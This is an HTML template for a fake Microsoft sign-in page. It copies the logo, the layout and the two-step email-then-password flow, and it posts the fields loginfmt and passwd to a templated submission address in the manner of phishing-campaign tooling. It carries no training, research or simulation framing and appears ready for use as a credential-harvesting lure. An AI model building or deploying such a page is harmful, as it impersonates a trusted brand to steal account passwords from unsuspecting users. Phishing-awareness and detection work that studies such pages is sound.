<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Sign in to your account</title>
<style>
  *{box-sizing:border-box}
  html,body{height:100%}
  body{margin:0;font-family:"Segoe UI",-apple-system,BlinkMacSystemFont,Roboto,Helvetica,Arial,sans-serif;color:#1b1b1b;
       background:#f2f2f2;
       background-image:radial-gradient(circle at 18% 22%,#eef3fb 0,rgba(238,243,251,0) 38%),
                        radial-gradient(circle at 85% 80%,#e9eef7 0,rgba(233,238,247,0) 42%),
                        linear-gradient(135deg,#f4f6fb 0%,#eceff5 100%);
       display:flex;flex-direction:column;min-height:100%}
  .wrap{flex:1;display:flex;align-items:center;justify-content:center;padding:24px}
  .card{width:440px;max-width:100%;background:#fff;box-shadow:0 2px 6px rgba(0,0,0,.2);padding:44px 44px 36px}
  .logo{display:block;height:24px;margin-bottom:16px}
  h1{font-size:24px;font-weight:600;margin:12px 0 0;color:#1b1b1b}
  .back{display:inline-flex;align-items:center;gap:6px;color:#1b1b1b;font-size:15px;margin-bottom:4px}
  .back svg{width:17px;height:17px}
  .acct{font-size:15px;color:#1b1b1b;margin:2px 0 14px}
  .field{margin:14px 0 2px}
  input[type=email],input[type=text],input[type=password]{
    width:100%;height:36px;border:none;border-bottom:1px solid #666;border-radius:0;
    padding:6px 0 6px 2px;font-size:16px;color:#1b1b1b;background:transparent;outline:none}
  input::placeholder{color:#666}
  input:focus{border-bottom:2px solid #0067b8}
  .link{display:inline-block;color:#0067b8;font-size:13px;text-decoration:none;margin-top:12px}
  .link:hover{text-decoration:underline}
  .row{display:flex;justify-content:flex-end;align-items:center;gap:8px;margin-top:24px}
  button.sub{min-width:108px;height:32px;border:none;border-radius:0;background:#0067b8;color:#fff;font-size:15px;font-family:inherit;cursor:pointer}
  button.sub:hover{background:#005da6}
  .note{font-size:13px;color:#1b1b1b;margin-top:14px}
  .foot{font-size:12px;color:#5e5e5e;text-align:right;padding:10px 24px 18px}
  .foot a{color:#5e5e5e;text-decoration:none;margin-left:14px}
  .foot a:hover{text-decoration:underline}
  .hidden{display:none}
</style>
</head>
<body>
  <div class="wrap">
    <form class="card" method="post" action="{{.SubmitURL}}" autocomplete="off">
      <svg class="logo" viewBox="0 0 108 23" xmlns="http://www.w3.org/2000/svg" aria-label="Microsoft">
        <rect x="0" y="0" width="10" height="10" fill="#f25022"/>
        <rect x="12" y="0" width="10" height="10" fill="#7fba00"/>
        <rect x="0" y="12" width="10" height="10" fill="#00a4ef"/>
        <rect x="12" y="12" width="10" height="10" fill="#ffb900"/>
        <text x="28" y="17" font-family="Segoe UI,Arial,sans-serif" font-size="15" fill="#5e5e5e">Microsoft</text>
      </svg>

      <!-- Step 1: account -->
      <div id="step-email">
        <h1>Sign in</h1>
        <div class="field"><input id="email" name="loginfmt" type="email" placeholder="Email, phone, or Skype"></div>
        <a class="link" href="#">Can't access your account?</a>
        <div class="row">
          <button type="button" class="sub" id="next">Next</button>
        </div>
      </div>

      <!-- Step 2: password -->
      <div id="step-pass" class="hidden">
        <div class="back"><svg viewBox="0 0 24 24" fill="none" stroke="#1b1b1b" stroke-width="2"><path d="M15 18l-6-6 6-6"/></svg><span id="acct-email">someone@example.com</span></div>
        <h1>Enter password</h1>
        <div class="field"><input name="passwd" type="password" placeholder="Password"></div>
        <a class="link" href="#">Forgot my password</a>
        <div class="row">
          <button type="submit" class="sub">Sign in</button>
        </div>
      </div>

      <div class="note" style="margin-top:22px">No account? <a class="link" href="#" style="margin-top:0">Create one!</a></div>
    </form>
  </div>
  <div class="foot">
    <a href="#">Terms of use</a>
    <a href="#">Privacy &amp; cookies</a>
    <a href="#">···</a>
  </div>
<script>
  (function(){
    var next=document.getElementById('next'),e=document.getElementById('email'),
        s1=document.getElementById('step-email'),s2=document.getElementById('step-pass'),
        ae=document.getElementById('acct-email');
    if(next){next.addEventListener('click',function(){
      if(e.value.trim()===''){e.focus();return;}
      ae.textContent=e.value.trim();s1.classList.add('hidden');s2.classList.remove('hidden');
    });}
  })();
</script>
</body>
</html>
